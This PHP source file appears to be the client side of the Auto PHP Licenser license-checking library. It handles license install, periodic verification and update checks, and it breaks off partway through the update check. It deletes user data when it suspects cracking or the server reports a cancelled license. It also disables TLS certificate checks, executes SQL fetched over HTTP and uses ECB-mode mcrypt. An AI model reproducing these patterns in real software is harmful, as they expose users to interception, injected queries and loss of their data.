<?php
//ALL THE FUNCTIONS IN THIS FILE START WITH apl_ TO PREVENT DUPLICATED NAMES WHEN AUTO PHP LICENSER SOURCE FILES ARE INTEGRATED INTO ANY SCRIPT


//encrypt/decrypt text with salt provided as function's parameter
function aplCustomEncrypt($text, $key)
    {
    return trim(base64_encode(mcrypt_encrypt(MCRYPT_RIJNDAEL_256, aplPadEncryptionSalt($key), $text, MCRYPT_MODE_ECB, mcrypt_create_iv(mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_ECB), MCRYPT_RAND))));
    }
function aplCustomDecrypt($text, $key)
    {
    return trim(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, aplPadEncryptionSalt($key), base64_decode($text), MCRYPT_MODE_ECB, mcrypt_create_iv(mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_ECB), MCRYPT_RAND)));
    }


//pad encryption salt (key) with \0 because PHP >=5.6 only accepts 16/24/32 symbols (used to maintain compatibility with old keys)
function aplPadEncryptionSalt($salt)
    {
    $allowed_lengths_array=array(16, 24, 32); //set allowed length
    $allowed_length_max=max($allowed_lengths_array);

    if (strlen($salt)>$allowed_length_max) //salt too long, cut it
        {
        $salt=substr($salt, 0, $allowed_length_max);
        }

    if (strlen($salt)<$allowed_length_max) //salt too short, pad with zeros
        {
        foreach ($allowed_lengths_array as $length) //loop through length and pad salt
            {
            while (strlen($salt)<$length)
                {
                $salt=$salt."\0";
                }

            if (strlen($salt)==$length) //nearest length reached
                {
                break;
                }
            }
        }

    return $salt;
    }


//check if variable is empty (standard PHP function returns true when variable is "0" (string) and has problems with constants prior ver 5.5)
function aplIsEmpty($var)
    {
    if (empty($var) && strlen(trim($var))==0)
        {
        $result=true;
        }
    else
        {
        $result=false;
        }

    return $result;
    }


//validate numbers (or ranges like 1-10) and check if they match min and max values
function aplValidateNumberOrRange($number, $min_value, $max_value)
    {
    $result=false;

    if (filter_var($number, FILTER_VALIDATE_INT)===0 || !filter_var($number, FILTER_VALIDATE_INT)===false) //number provided
        {
        if ($number>=$min_value && $number<=$max_value)
            {
            $result=true;
            }
        else
            {
            $result=false;
            }
        }

    if (stristr($number, "-")) //range provided
        {
        $numbers_array=explode("-", $number);
        if (filter_var($numbers_array[0], FILTER_VALIDATE_INT)===0 || !filter_var($numbers_array[0], FILTER_VALIDATE_INT)===false && filter_var($numbers_array[1], FILTER_VALIDATE_INT)===0 || !filter_var($numbers_array[1], FILTER_VALIDATE_INT)===false)
            {
            if ($numbers_array[0]>=$min_value && $numbers_array[1]<=$max_value && $numbers_array[0]<=$numbers_array[1])
                {
                $result=true;
                }
            else
                {
                $result=false;
                }
            }
        }

    return $result;
    }


//get current page url (also remove specific strings and last slash if needed)
function aplGetCurrentUrl($remove_last_slash, $string_to_remove_array)
    {
    $current_url="";

    $protocol=!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS']!=="off" ? 'https' : 'http';
    $host=$_SERVER['HTTP_HOST'];
    $script=$_SERVER['SCRIPT_NAME'];
    $params=$_SERVER['QUERY_STRING'];

    if (!empty($protocol) && !empty($host) && !empty($script)) //return URL only when script is executed via browser (because no URL should exist when executed from command line)
        {
        $current_url=$protocol.'://'.$host.$script;

        if (!empty($params))
            {
            $current_url.='?'.$params;
            }

        if (!empty($string_to_remove_array) && is_array($string_to_remove_array)) //remove specific strings from URL
            {
            foreach ($string_to_remove_array as $key=>$value)
                {
                $current_url=str_ireplace($value, "", $current_url);
                }
            }

        if ($remove_last_slash==1) //remove / from the end of URL if it exists
            {
            while (substr($current_url, -1)=="/") //use cycle in case URL already contained multiple // at the end
                {
                $current_url=substr($current_url, 0, -1);
                }
            }
        }

    return $current_url;
    }


//get raw domain (returns (sub.)domain.com from url like http://www.(sub.)domain.com/something.php?xx=yy)
function aplGetRawDomain($url)
    {
    $raw_domain="";

    if (!empty($url))
        {
        $url_array=parse_url($url);
        if (empty($url_array['scheme'])) //in case no scheme was provided in url, it will be parsed incorrectly. add http:// and re-parse
            {
            $url="http://".$url;
            $url_array=parse_url($url);
            }

        if (!empty($url_array['host']))
            {
            $raw_domain=$url_array['host'];

            $raw_domain=trim(str_ireplace("www.", "", filter_var($raw_domain, FILTER_SANITIZE_URL)));
            }
        }

    return $raw_domain;
    }


//return root url from long url (http://www.domain.com/path/file.php?aa=xx becomes http://www.domain.com/path/), remove scheme, www. and last slash if needed
function aplGetRootUrl($url, $remove_scheme, $remove_www, $remove_path, $remove_last_slash)
    {
    if (filter_var($url, FILTER_VALIDATE_URL, FILTER_FLAG_SCHEME_REQUIRED | FILTER_FLAG_HOST_REQUIRED))
        {
        $url_array=parse_url($url); //parse URL into arrays like $url_array['scheme'], $url_array['host'], etc

        $url=str_ireplace($url_array['scheme']."://", "", $url); //make URL without scheme, so no :// is included when searching for first or last /

        if ($remove_path==1) //remove everything after FIRST / in URL, so it becomes "real" root URL
            {
            $first_slash_position=stripos($url, "/"); //find FIRST slash - the end of root URL
            if ($first_slash_position>0) //cut URL up to FIRST slash
                {
                $url=substr($url, 0, $first_slash_position+1);
                }
            }
        else //remove everything after LAST / in URL, so it becomes "normal" root URL
            {
            $last_slash_position=strripos($url, "/"); //find LAST slash - the end of root URL
            if ($last_slash_position>0) //cut URL up to LAST slash
                {
                $url=substr($url, 0, $last_slash_position+1);
                }
            }

        if ($remove_scheme!=1) //scheme was already removed, add it again
            {
            $url=$url_array['scheme']."://".$url;
            }

        if ($remove_www==1) //remove www.
            {
            $url=str_ireplace("www.", "", $url);
            }

        if ($remove_last_slash==1) //remove / from the end of URL if it exists
            {
            while (substr($url, -1)=="/") //use cycle in case URL already contained multiple // at the end
                {
                $url=substr($url, 0, -1);
                }
            }
        }

    return trim($url);
    }


//make post requests with cookies, referrers, etc
function aplCustomPost($url, $refer, $post_info)
    {
    $USER_AGENT="Mozilla/5.0 (Windows NT 6.3; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0";
    $CONNECT_TIMEOUT=10;

    if (!isset($refer) ||  !filter_var($refer, FILTER_VALIDATE_URL, FILTER_FLAG_SCHEME_REQUIRED | FILTER_FLAG_HOST_REQUIRED)) {$refer=$url;} //use original url as refer when no valid URL provided

    $ch=curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_USERAGENT, $USER_AGENT);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $CONNECT_TIMEOUT);
    curl_setopt($ch, CURLOPT_TIMEOUT, $CONNECT_TIMEOUT);
    curl_setopt($ch, CURLOPT_REFERER, $refer);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_info);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
    $result=curl_exec($ch);
    curl_close($ch);

    return $result;
    }


//verify date according to provided format (such as Y-m-d)
function aplVerifyDate($date, $date_format)
    {
    $datetime=DateTime::createFromFormat($date_format, $date);
    $errors=DateTime::getLastErrors();
    if (!$datetime || !empty($errors['warning_count'])) //date was invalid
        {
        $date_check_ok=false;
        }
    else //everything OK
        {
        $date_check_ok=true;
        }

    return $date_check_ok;
    }


//calculate number of days between dates
function apl_getDaysBetweenDates($date_from, $date_to)
    {
    $number_of_days=0;

    if (aplVerifyDate($date_from, "Y-m-d") && aplVerifyDate($date_to, "Y-m-d"))
        {
        $date_to=new DateTime($date_to);
        $date_from=new DateTime($date_from);
        $number_of_days=$date_from->diff($date_to)->format("%a");
        }

    return $number_of_days;
    }


//convert objects into arrays
function aplConvertObjectToArray($arrObjData, $arrSkipIndices=array())
    {
    $arrData=array();

    if (is_object($arrObjData)) //if input is object, convert into array
        {
        $arrObjData = get_object_vars($arrObjData);
        }

    if (is_array($arrObjData))
        {
        foreach ($arrObjData as $index=>$value)
            {
            if (is_object($value) || is_array($value))
                {
                $value=aplConvertObjectToArray($value, $arrSkipIndices); //recursive call
                }
            if (in_array($index, $arrSkipIndices))
                {
                continue;
                }
            $arrData[$index]=$value;
            }
        }

    return $arrData;
    }


//parse values between specified xml-like tags
function aplParseXmlTags($content, $tag_name)
    {
    $parsed_value="";

    if (!empty($content) && !empty($tag_name))
        {
        preg_match_all("/<".preg_quote($tag_name, "/").">(.*?)<\/".preg_quote($tag_name, "/").">/ims", $content, $output_array, PREG_SET_ORDER);

        if (!empty($output_array[0][1]))
            {
            $parsed_value=trim($output_array[0][1]);
            }
        }

    return $parsed_value;
    }


//parse license notifications tags generated by APL server
function aplParseLicenseNotifications($content)
    {
    $notifications_array=array();

    if (!empty($content))
        {
        preg_match_all("/<notification_([a-z_]+)>(.*?)<\/notification_([a-z_]+)>/", $content, $output_array, PREG_SET_ORDER); //parse <notification_case> along with message

        if (!empty($output_array[0][1]) && $output_array[0][1]==$output_array[0][3] && !empty($output_array[0][2])) //check if both notification tags are the same and contain text inside
            {
            $notifications_array['notification_case']="notification_".$output_array[0][1];
            $notifications_array['notification_text']=$output_array[0][2];
            }
        }

    return $notifications_array;
    }


//generate signature to be submitted to Auto PHP Licenser server (used in apl_install_license, apl_verify_license and apl_verify_updates functions)
function aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)
    {
    $license_signature=hash("sha256", gmdate("Y-m-d").$ROOT_URL.$CLIENT_EMAIL.$LICENSE_CODE.APL_PRODUCT_ID.implode("", (gethostbynamel(aplGetRawDomain(APL_ROOT_URL)))));

    return $license_signature;
    }


//verify signature received from Auto PHP Licenser server (used in apl_install_license, apl_verify_license and apl_verify_updates functions)
function aplVerifyServerSignature($content, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)
    {
    $license_signature=aplParseXmlTags($content, "license_signature");
    $signature_ok=false;

    if (!empty($license_signature) && hash("sha256", implode("", (gethostbynamel(aplGetRawDomain(APL_ROOT_URL)))).APL_PRODUCT_ID.$LICENSE_CODE.$CLIENT_EMAIL.$ROOT_URL.gmdate("Y-m-d"))==$license_signature)
        {
        $signature_ok=true;
        }

    return $signature_ok;
    }


//check Auto PHP Licenser core configuration and return an array with error messages if something wrong
function aplCheckSettings()
    {
    $notifications_array=array();

    if (aplIsEmpty(APL_SALT) || APL_SALT=="some_random_text")
        {
        $notifications_array[]=APL_CORE_NOTIFICATION_INVALID_SALT; //invalid encryption salt
        }

    if (!filter_var(APL_ROOT_URL, FILTER_VALIDATE_URL, FILTER_FLAG_SCHEME_REQUIRED | FILTER_FLAG_HOST_REQUIRED) || !ctype_alnum(substr(APL_ROOT_URL, -1))) //invalid APL installation URL
        {
        $notifications_array[]=APL_CORE_NOTIFICATION_INVALID_ROOT_URL;
        }

    if (!filter_var(APL_PRODUCT_ID, FILTER_VALIDATE_INT)) //invalid APL product ID
        {
        $notifications_array[]=APL_CORE_NOTIFICATION_INVALID_PRODUCT_ID;
        }

    if (!aplValidateNumberOrRange(APL_DAYS, 1, 365)) //invalid verification period
        {
        $notifications_array[]=APL_CORE_NOTIFICATION_INVALID_VERIFICATION_PERIOD;
        }

    if (APL_STORAGE!="DATABASE" && APL_STORAGE!="FILE") //invalid data storage
        {
        $notifications_array[]=APL_CORE_NOTIFICATION_INVALID_STORAGE;
        }

    if (APL_STORAGE=="DATABASE" && !ctype_alnum(str_ireplace(array("_"), "", APL_DATABASE_TABLE))) //invalid license table name
        {
        $notifications_array[]=APL_CORE_NOTIFICATION_INVALID_TABLE;
        }

    if (APL_STORAGE=="FILE" && !@is_writable(APL_DIRECTORY."/".APL_LICENSE_FILE_LOCATION)) //invalid license file
        {
        $notifications_array[]=APL_CORE_NOTIFICATION_INVALID_LICENSE_FILE;
        }

    if (APL_STORAGE=="DATABASE" && !@is_readable(APL_DIRECTORY."/".APL_MYSQL_FILE_LOCATION)) //invalid MySQL file
        {
        $notifications_array[]=APL_CORE_NOTIFICATION_INVALID_MYSQL_FILE;
        }

    if (aplIsEmpty(APL_NOTIFICATION_NO_CONNECTION)) //no message for "no connection" event
        {
        $notifications_array[]=APL_CORE_NOTIFICATION_INVALID_NOTIFICATION_NO_CONNECTION;
        }

    if (aplIsEmpty(APL_NOTIFICATION_DATABASE_WRITE_ERROR)) //no message for "database write error" event
        {
        $notifications_array[]=APL_CORE_NOTIFICATION_INVALID_NOTIFICATION_DATABASE_WRITE_ERROR;
        }

    if (aplIsEmpty(APL_NOTIFICATION_LICENSE_FILE_WRITE_ERROR)) //no message for "license file write error" event
        {
        $notifications_array[]=APL_CORE_NOTIFICATION_INVALID_NOTIFICATION_LICENSE_FILE_WRITE_ERROR;
        }

    if (aplIsEmpty(APL_NOTIFICATION_SCRIPT_ALREADY_INSTALLED)) //no message for "script already installed" event
        {
        $notifications_array[]=APL_CORE_NOTIFICATION_INVALID_NOTIFICATION_SCRIPT_ALREADY_INSTALLED_ERROR;
        }

    if (!aplIsEmpty(APL_ROOT_IP) && !filter_var(APL_ROOT_IP, FILTER_VALIDATE_IP)) //invalid APL server IP
        {
        $notifications_array[]=APL_CORE_NOTIFICATION_INVALID_ROOT_IP;
        }

    if (!aplIsEmpty(APL_ROOT_IP) && !in_array(APL_ROOT_IP, gethostbynamel(aplGetRawDomain(APL_ROOT_URL)))) //IP address of APL server doesn't match APL server domain
        {
        $notifications_array[]=APL_CORE_NOTIFICATION_INVALID_DNS;
        }

    return $notifications_array;
    }


//check if connection is OK
function aplCheckConnection()
    {
    $notifications_array=array();

    if (aplCustomPost(APL_ROOT_URL."/apl_callbacks/connection_test.php", APL_ROOT_URL, "connection_hash=".rawurlencode(hash("sha256", "connection_test")))!="<connection_test>OK</connection_test>") //no content received from APL server
        {
        $notifications_array[]=APL_CORE_NOTIFICATION_INACCESSIBLE_ROOT_URL;
        }

    return $notifications_array;
    }


//check Auto PHP Licenser variables and return false if something wrong
function aplCheckData($MYSQLI_LINK)
    {
    $error_detected=0;
    $cracking_detected=0;
    $data_check_result=false;

    if (APL_STORAGE=="DATABASE") //settings stored in database
        {
        $settings_results=mysqli_query($MYSQLI_LINK, "SELECT * FROM ".APL_DATABASE_TABLE);
        while ($settings_row=mysqli_fetch_assoc($settings_results))
            {
            foreach ($settings_row as $settings_key=>$settings_value)
                {
                $$settings_key=$settings_value;
                }
            }
        }

    if (APL_STORAGE=="FILE") //settings stored in file
        {
        $file_content=@file_get_contents(APL_DIRECTORY."/".APL_LICENSE_FILE_LOCATION);
        preg_match_all("/<([A-Z_]+)>(.*?)<\/([A-Z_]+)>/", $file_content, $file_settings_array, PREG_SET_ORDER);
        if (is_array($file_settings_array))
            {
            foreach ($file_settings_array as $file_settings_key=>$file_settings_value)
                {
                if (!empty($file_settings_value[1]) && $file_settings_value[1]==$file_settings_value[3])
                    {
                    $$file_settings_value[1]=$file_settings_value[2];
                    }
                }
            }
        }

    if (!filter_var($ROOT_URL, FILTER_VALIDATE_URL, FILTER_FLAG_SCHEME_REQUIRED | FILTER_FLAG_HOST_REQUIRED) || !ctype_alnum(substr($ROOT_URL, -1))) //invalid script url
        {
        $error_detected=1;
        }

    if (filter_var(aplGetCurrentUrl(0, array()), FILTER_VALIDATE_URL, FILTER_FLAG_SCHEME_REQUIRED | FILTER_FLAG_HOST_REQUIRED) && stristr(aplGetRootUrl(aplGetCurrentUrl(0, array()), 1, 1, 0, 1), aplGetRootUrl("$ROOT_URL/", 1, 1, 0, 1))===false) //script is opened via browser (current_url set), but current_url is different from value in database
        {
        $error_detected=1;
        }

    if (empty($INSTALLATION_HASH) || $INSTALLATION_HASH!=hash("sha256", $ROOT_URL.$CLIENT_EMAIL.$LICENSE_CODE)) //invalid installation hash (value - $ROOT_URL, $CLIENT_EMAIL AND $LICENSE_CODE encrypted with sha256)
        {
        $error_detected=1;
        }

    if (empty($INSTALLATION_KEY) || !password_verify(aplCustomDecrypt($LRD, APL_SALT.$INSTALLATION_KEY), aplCustomDecrypt($INSTALLATION_KEY, APL_SALT.$ROOT_URL))) //invalid installation key (value - current date ("Y-m-d") encrypted with password_hash and then encrypted with custom function (salt - $ROOT_URL). Put simply, it's LRD value, only encrypted different way)
        {
        $error_detected=1;
        }

    if (!aplVerifyDate(aplCustomDecrypt($LCD, APL_SALT.$INSTALLATION_KEY), "Y-m-d")) //last check date is invalid
        {
        $error_detected=1;
        }

    if (!aplVerifyDate(aplCustomDecrypt($LRD, APL_SALT.$INSTALLATION_KEY), "Y-m-d")) //last run date is invalid
        {
        $error_detected=1;
        }


    //check for possible cracking attempts - starts
    if (aplVerifyDate(aplCustomDecrypt($LCD, APL_SALT.$INSTALLATION_KEY), "Y-m-d") && aplCustomDecrypt($LCD, APL_SALT.$INSTALLATION_KEY)>date("Y-m-d")) //last check date is VALID, but higher than current date (someone manually overwrote it or changed system time)
        {
        $error_detected=1;
        $cracking_detected=1;
        }

    if (aplVerifyDate(aplCustomDecrypt($LRD, APL_SALT.$INSTALLATION_KEY), "Y-m-d") && aplCustomDecrypt($LRD, APL_SALT.$INSTALLATION_KEY)>date("Y-m-d")) //last run date is VALID, but higher than current date (someone manually overwrote it or changed system time)
        {
        $error_detected=1;
        $cracking_detected=1;
        }

    if (aplVerifyDate(aplCustomDecrypt($LCD, APL_SALT.$INSTALLATION_KEY), "Y-m-d") && aplVerifyDate(aplCustomDecrypt($LRD, APL_SALT.$INSTALLATION_KEY), "Y-m-d") && aplCustomDecrypt($LCD, APL_SALT.$INSTALLATION_KEY)>aplCustomDecrypt($LRD, APL_SALT.$INSTALLATION_KEY)) //last check date and last run date is VALID, but LCD is higher than LRD (someone manually overwrote it or changed system time)
        {
        $error_detected=1;
        $cracking_detected=1;
        }


    if ($cracking_detected==1 && APL_DELETE_CRACKED=="YES") //delete user data
        {
        aplDeleteData($MYSQLI_LINK);
        }
    //check for possible cracking attempts - ends


    if ($error_detected!=1) //everything ok
        {
        $data_check_result=true;
        }

    return $data_check_result;
    }


//install license
function aplInstallLicense($MYSQLI_LINK, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)
    {
    $notifications_array=array();

    //check if script is not yet installed
    if (APL_STORAGE=="DATABASE") //settings stored in database
        {
        $settings_results=@mysqli_query($MYSQLI_LINK, "SELECT INSTALLATION_HASH FROM ".APL_DATABASE_TABLE);
        while ($settings_row=@mysqli_fetch_assoc($settings_results))
            {
            foreach ($settings_row as $settings_key=>$settings_value)
                {
                $$settings_key=$settings_value;
                }
            }
        }

    if (APL_STORAGE=="FILE") //settings stored in file
        {
        $file_content=@file_get_contents(APL_DIRECTORY."/".APL_LICENSE_FILE_LOCATION);
        preg_match_all("/<([A-Z_]+)>(.*?)<\/([A-Z_]+)>/", $file_content, $file_settings_array, PREG_SET_ORDER);
        if (is_array($file_settings_array))
            {
            foreach ($file_settings_array as $file_settings_key=>$file_settings_value)
                {
                if (!empty($file_settings_value[1]) && $file_settings_value[1]==$file_settings_value[3])
                    {
                    $$file_settings_value[1]=$file_settings_value[2];
                    }
                }
            }
        }


    if (!empty($INSTALLATION_HASH)) //script already installed
        {
        $notifications_array['notification_case']="notification_already_installed";
        $notifications_array['notification_text']=APL_NOTIFICATION_SCRIPT_ALREADY_INSTALLED;
        }
    else //script not yet installed, do it now
        {
        $INSTALLATION_HASH=hash("sha256", $ROOT_URL.$CLIENT_EMAIL.$LICENSE_CODE); //generate hash

        $post_info="product_id=".rawurlencode(APL_PRODUCT_ID)."&client_email=".rawurlencode($CLIENT_EMAIL)."&license_code=".rawurlencode($LICENSE_CODE)."&root_url=".rawurlencode($ROOT_URL)."&installation_hash=".rawurlencode($INSTALLATION_HASH)."&license_signature=".rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));

        $content=aplCustomPost(APL_ROOT_URL."/apl_callbacks/license_install.php", $ROOT_URL, $post_info);
        if (!empty($content)) //content received, do other tests
            {
            if (!aplIsEmpty(aplParseXmlTags($content, "notification_license_ok")) && aplVerifyServerSignature($content, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)) //everything OK
                {
                $INSTALLATION_KEY=aplCustomEncrypt(password_hash(date("Y-m-d"), PASSWORD_DEFAULT), APL_SALT.$ROOT_URL); //generate $INSTALLATION_KEY first because it will be used as salt to encrypt LCD and LRD!!!
                $LCD=aplCustomEncrypt(date("Y-m-d", strtotime("-".APL_DAYS." days")), APL_SALT.$INSTALLATION_KEY); //license will need to be verified right after installation
                $LRD=aplCustomEncrypt(date("Y-m-d"), APL_SALT.$INSTALLATION_KEY);

                if (APL_STORAGE=="DATABASE") //settings stored in database
                    {
                    if (APL_MYSQL_QUERY=="LOCAL") //get MySQL query from local source
                        {
                        $post_info="apl_database_table=".rawurlencode(APL_DATABASE_TABLE)."&root_url=".rawurlencode($ROOT_URL)."&client_email=".rawurlencode($CLIENT_EMAIL)."&license_code=".rawurlencode($LICENSE_CODE)."&lcd=".rawurlencode($LCD)."&lrd=".rawurlencode($LRD)."&installation_key=".rawurlencode($INSTALLATION_KEY)."&installation_hash=".rawurlencode($INSTALLATION_HASH)."&local_post_key=".rawurlencode(hash("sha256", $ROOT_URL))."&submit_ok=Submit"; //pass all variables that need to be used in MySQL query

                        $mysql_query=aplCustomPost("$ROOT_URL/".basename(APL_DIRECTORY)."/".APL_MYSQL_FILE_LOCATION, $ROOT_URL, $post_info);
                        }
                    mysqli_multi_query($MYSQLI_LINK, $mysql_query) or die(mysqli_error($MYSQLI_LINK));
                    }

                if (APL_STORAGE=="FILE") //settings stored in file
                    {
                    $handle=@fopen(APL_DIRECTORY."/".APL_LICENSE_FILE_LOCATION, "w+");
                    $fwrite=@fwrite($handle, "<ROOT_URL>$ROOT_URL</ROOT_URL><CLIENT_EMAIL>$CLIENT_EMAIL</CLIENT_EMAIL><LICENSE_CODE>$LICENSE_CODE</LICENSE_CODE><LCD>$LCD</LCD><LRD>$LRD</LRD><INSTALLATION_KEY>$INSTALLATION_KEY</INSTALLATION_KEY><INSTALLATION_HASH>$INSTALLATION_HASH</INSTALLATION_HASH>");
                    if ($fwrite===false) //updating file failed
                        {
                        echo APL_NOTIFICATION_LICENSE_FILE_WRITE_ERROR;
                        exit();
                        }
                    @fclose($handle);
                    }

                $notifications_array['notification_case']="notification_license_ok";
                $notifications_array['notification_text']=aplParseXmlTags($content, "notification_license_ok");
                }
            else //check failed
                {
                $notifications_array=aplParseLicenseNotifications($content); //parse <notification_case> along with message
                }
            }
        else //no content received
            {
            $notifications_array['notification_case']="notification_no_connection";
            $notifications_array['notification_text']=APL_NOTIFICATION_NO_CONNECTION;
            }
        }

    return $notifications_array;
    }


//verify license
function aplVerifyLicense($MYSQLI_LINK, $FORCE_VERIFICATION)
    {
    $notifications_array=array();
    $update_lrd_value=0;
    $update_lcd_value=0;
    $updated_records=0;

    if (APL_STORAGE=="DATABASE") //settings stored in database
        {
        $settings_results=mysqli_query($MYSQLI_LINK, "SELECT * FROM ".APL_DATABASE_TABLE);
        while ($settings_row=mysqli_fetch_assoc($settings_results))
            {
            foreach ($settings_row as $settings_key=>$settings_value)
                {
                $$settings_key=$settings_value;
                }
            }
        }

    if (APL_STORAGE=="FILE") //settings stored in file
        {
        $file_content=@file_get_contents(APL_DIRECTORY."/".APL_LICENSE_FILE_LOCATION);
        preg_match_all("/<([A-Z_]+)>(.*?)<\/([A-Z_]+)>/", $file_content, $file_settings_array, PREG_SET_ORDER);
        if (is_array($file_settings_array))
            {
            foreach ($file_settings_array as $file_settings_key=>$file_settings_value)
                {
                if (!empty($file_settings_value[1]) && $file_settings_value[1]==$file_settings_value[3])
                    {
                    $$file_settings_value[1]=$file_settings_value[2];
                    }
                }
            }
        }


    if (aplCustomDecrypt($LRD, APL_SALT.$INSTALLATION_KEY)<date("Y-m-d")) //used to make sure database gets updated only once a day, not every time script is executed. do it BEFORE new $INSTALLATION_KEY is generated
        {
        $update_lrd_value=1;
        }


    if (apl_getDaysBetweenDates(aplCustomDecrypt($LCD, APL_SALT.$INSTALLATION_KEY), date("Y-m-d"))>=APL_DAYS || $FORCE_VERIFICATION==1) //time to verify license (or use forced verification)
        {
        $post_info="product_id=".rawurlencode(APL_PRODUCT_ID)."&client_email=".rawurlencode($CLIENT_EMAIL)."&license_code=".rawurlencode($LICENSE_CODE)."&root_url=".rawurlencode($ROOT_URL)."&installation_hash=".rawurlencode($INSTALLATION_HASH)."&license_signature=".rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));

        $content=aplCustomPost(APL_ROOT_URL."/apl_callbacks/license_verify.php", $ROOT_URL, $post_info);
        if (!empty($content)) //content received, do other tests
            {
            if (!aplIsEmpty(aplParseXmlTags($content, "notification_license_ok")) && aplVerifyServerSignature($content, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)) //everything OK
                {
                $update_lcd_value=1;

                $notifications_array['notification_case']="notification_license_ok";
                $notifications_array['notification_text']=aplParseXmlTags($content, "notification_license_ok");
                }
            else //check failed
                {
                $notifications_array=aplParseLicenseNotifications($content); //parse <notification_case> along with message
                }


            if (!aplIsEmpty(aplParseXmlTags($content, "notification_license_cancelled")) && APL_DELETE_CANCELLED=="YES") //license cancelled, data deletion activated, so delete user data
                {
                aplDeleteData($MYSQLI_LINK);
                }
            }
        else //no content received
            {
            $notifications_array['notification_case']="notification_no_connection";
            $notifications_array['notification_text']=APL_NOTIFICATION_NO_CONNECTION;
            }
        }
    else //no need to verify license, return notification_license_ok case, so script can continue working
        {
        $notifications_array['notification_case']="notification_license_ok";
        $notifications_array['notification_text']=APL_NOTIFICATION_BYPASS_VERIFICATION;
        }


    if ($update_lrd_value==1 || $update_lcd_value==1) //update database only if $LRD or $LCD were changed
        {
        if ($update_lcd_value==1) //generate new $LCD value ONLY if verification succeeded. Otherwise, old $LCD value should be used, so license will be verified again next time script is executed
            {
            $LCD=date("Y-m-d");
            }
        else //get existing DECRYPTED $LCD value because it will need to be re-encrypted using new $INSTALLATION_KEY in case license verification didn't succeed
            {
            $LCD=aplCustomDecrypt($LCD, APL_SALT.$INSTALLATION_KEY);
            }

        $INSTALLATION_KEY=aplCustomEncrypt(password_hash(date("Y-m-d"), PASSWORD_DEFAULT), APL_SALT.$ROOT_URL); //generate $INSTALLATION_KEY first because it will be used as salt to encrypt LCD and LRD!!!
        $LCD=aplCustomEncrypt($LCD, APL_SALT.$INSTALLATION_KEY); //finally encrypt $LCD value (it will contain either DECRYPTED old date, either non-encrypted today's date)
        $LRD=aplCustomEncrypt(date("Y-m-d"), APL_SALT.$INSTALLATION_KEY); //generate new $LRD value every time database needs to be updated (because if LCD is higher than LRD, cracking attempt will be detected).

        if (APL_STORAGE=="DATABASE") //settings stored in database
            {
            $stmt=mysqli_prepare($MYSQLI_LINK, "UPDATE ".APL_DATABASE_TABLE." SET LCD=?, LRD=?, INSTALLATION_KEY=?");
            if ($stmt)
                {
                mysqli_stmt_bind_param($stmt, "sss", $LCD, $LRD, $INSTALLATION_KEY);
                $exec=mysqli_stmt_execute($stmt);
                $affected_rows=mysqli_stmt_affected_rows($stmt); if ($affected_rows>0) {$updated_records=$updated_records+$affected_rows;}
                mysqli_stmt_close($stmt);
                }

            if ($exec===false) //updating database failed (don't use $updated_records variable here because when LRD variable is the same (script launched Nth time same day), $affected_rows will be 0)
                {
                echo APL_NOTIFICATION_DATABASE_WRITE_ERROR;
                exit();
                }
            }

        if (APL_STORAGE=="FILE") //settings stored in file
            {
            $handle=@fopen(APL_DIRECTORY."/".APL_LICENSE_FILE_LOCATION, "w+");
            $fwrite=@fwrite($handle, "<ROOT_URL>$ROOT_URL</ROOT_URL><CLIENT_EMAIL>$CLIENT_EMAIL</CLIENT_EMAIL><LICENSE_CODE>$LICENSE_CODE</LICENSE_CODE><LCD>$LCD</LCD><LRD>$LRD</LRD><INSTALLATION_KEY>$INSTALLATION_KEY</INSTALLATION_KEY><INSTALLATION_HASH>$INSTALLATION_HASH</INSTALLATION_HASH>");
            if ($fwrite===false) //updating file failed
                {
                echo APL_NOTIFICATION_LICENSE_FILE_WRITE_ERROR;
                exit();
                }
            @fclose($handle);
            }
        }

    return $notifications_array;
    }


//verify updates
function aplVerifyUpdates($MYSQLI_LINK)
    {
    $notifications_array=array();

    if (APL_STORAGE=="DATABASE") //settings stored in database
        {
        $settings_results=mysqli_query($MYSQLI_LINK, "SELECT * FROM ".APL_DATABASE_TABLE);
        while ($settings_row=mysqli_fetch_assoc($settings_results))
            {
            foreach ($settings_row as $settings_key=>$settings_value)
                {
                $$settings_key=$settings_value;
                }
            }
        }

    if (APL_STORAGE=="FILE") //settings stored in file
        {
        $file_content=@file_get_contents(APL_DIRECTORY."/".APL_LICENSE_FILE_LOCATION);
        preg_match_all("/<([A-Z_]+)>(.*?)<\/([A-Z_]+)>/", $file_content, $file_settings_array, PREG_SET_ORDER);
        if (is_array($file_settings_array))
            {
            foreach ($file_settings_array as $file_settings_key=>$file_settings_value)
                {
                if (!empty($file_settings_value[1]) && $file_settings_value[1]==$file_settings_value[3])
                    {
                    $$file_settings_value[1]=$file_settings_value[2];
                    }
                }
            }
        }


    $post_info="product_id=".rawurlencode(APL_PRODUCT_ID)."&client_email=".rawurlencode($CLIENT_EMAIL)."&license_code=".rawurlencode($LICENSE_CODE)."&root_url=".rawurlencode($ROOT_URL)."&installation_hash=".rawurlencode($INSTALLATION_HASH)."&license_signature=".rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));

    $content=aplCustomPost(APL_ROOT_URL."/apl_callbacks/license_updates.php", $ROOT_URL, $post_info);
